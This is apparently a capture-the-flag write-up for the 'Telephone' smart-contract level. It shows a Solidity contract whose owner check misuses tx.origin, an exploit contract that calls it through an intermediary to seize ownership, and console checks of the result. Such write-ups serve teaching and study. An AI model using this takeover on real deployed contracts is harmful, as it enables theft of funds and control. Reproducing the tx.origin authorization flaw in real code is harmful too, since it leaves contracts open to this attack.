# 04. Telephone

Claim ownership of the contract below to complete this level.

Things that might help:

- See the Help page above, section "Beyond the console"

## Solution

In order to change the owner of the contract we can exploit the following function:

```solidity
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

`tx.origin` and `msg.sender` difference is explained [here](https://ethereum.stackexchange.com/a/1892)

To successfully take the ownership of the contract we need to exploit another contract.

In Remix IDE:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
// -------------------------------- Original contract 
contract Telephone {
  address public owner;
  constructor() public {
    owner = msg.sender;
  }
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
// -------------------------------- Exploit           
contract Exploit {
    address originalAddress = 0x2BeE993f44d271A87C858367DFEaE036b20e5ADf;  // Change this with the challenge address
    Telephone public originalContract = Telephone(originalAddress);
    function takeOwnership(address me) public {
        originalContract.changeOwner(me);
    }
}
```

In this way, when we call `Exploit.takeOwnership`, `tx.origin` will be equals to `player`, while `msg.sender` will be equal to `Exploit` contract address

```javascript
// Before executing the contract exploit
await contract.owner() == player
// -> false
// After exploit execution
await contract.owner() == player
// -> true
```

